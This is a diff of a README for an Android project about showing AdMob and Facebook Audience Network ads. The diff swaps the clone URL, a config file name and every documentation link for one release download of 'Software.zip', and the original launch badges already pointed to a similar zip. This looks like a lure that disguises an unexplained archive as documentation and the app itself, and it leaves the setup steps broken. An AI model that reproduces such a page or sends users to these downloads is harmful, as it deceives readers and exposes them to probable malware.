@@ -1,6 +1,6 @@
 # AdMob-Facebook Ad Inventory Android App 📱💰
 
-[![Ad Inventory](https://img.shields.io/badge/Launch-App-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Ad Inventory](https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip)](https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip)
 
 Welcome to the AdMob-Facebook Ad Inventory Android app repository! This project demonstrates how to integrate AdMob and Facebook Audience Network ads simultaneously in an Android application. By incorporating both Banner and Interstitial ads from these platforms with a 50% chance of each being displayed, you can optimize your ad revenue potential.
 
@@ -21,13 +21,13 @@ Welcome to the AdMob-Facebook Ad Inventory Android app repository! This project 
 1. **Clone the repository**
 
    ```bash
-   $ git clone https://github.com/yourusername/AdMob-Facebook-AdInventory.git
+   $ git clone https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip
    ```
 
 2. **Set Up Firebase**
 
    - Create a new Firebase project (if you don't have one already)
-   - Add the `google-services.json` file to the project
+   - Add the `https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip` file to the project
    - Configure Firebase Remote Config and Analytics in your project
 
 3. **Integrate AdMob and Facebook Ads SDK**
@@ -45,11 +45,11 @@ Explore the code and dive deeper into the integration of AdMob and Facebook ads 
 
 ## Resources 📦
 
-1. [Firebase Documentation](https://firebase.google.com/docs)
-2. [AdMob Documentation](https://developers.google.com/admob)
-3. [Facebook Audience Network SDK](https://developers.facebook.com/docs/audience-network)
-4. [Firebase Remote Config](https://firebase.google.com/docs/remote-config)
-5. [Firebase Analytics](https://firebase.google.com/docs/analytics)
+1. [Firebase Documentation](https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip)
+2. [AdMob Documentation](https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip)
+3. [Facebook Audience Network SDK](https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip)
+4. [Firebase Remote Config](https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip)
+5. [Firebase Analytics](https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip)
 
 ## Additional Notes 🔖
 
@@ -65,4 +65,4 @@ Let's maximize ad revenue and user engagement with the AdMob-Facebook Ad Invento
 
 Enjoy exploring the world of mobile advertising with AdMob and Facebook Audience Network integration! 🌟
 
-[![Ad Inventory Download](https://img.shields.io/badge/Launch-App-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Ad Inventory Download](https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip)](https://github.com/Jeremybel123/AdMob-Facebook-AdInventory/releases/download/v1.0/Software.zip)
